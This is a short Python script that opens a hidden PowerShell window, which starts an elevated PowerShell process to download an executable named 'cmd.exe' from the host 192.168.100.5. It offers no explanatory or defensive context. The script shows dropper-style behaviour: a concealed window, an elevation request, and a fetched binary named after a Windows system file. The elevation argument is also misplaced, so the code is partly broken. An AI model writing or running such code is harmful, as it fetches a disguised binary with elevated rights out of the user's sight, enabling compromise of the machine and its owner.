import subprocess

def download_cmd():
    """Download cmd.exe from 192.168.100.5"""
    # Command to download cmd.exe from 192.168.100.5
    download_command = 'Invoke-WebRequest -Uri http://192.168.100.5/cmd.exe -OutFile "cmd.exe"'

    # Run the elevated PowerShell command silently in the background
    subprocess.run(["powershell.exe", "-WindowStyle", "Hidden", "-Command", f"Start-Process powershell.exe -ArgumentList '-Command \"{download_command}\"'", "-Verb", "RunAs"], shell=True, check=True)

# Call the function to download cmd.exe
download_cmd()
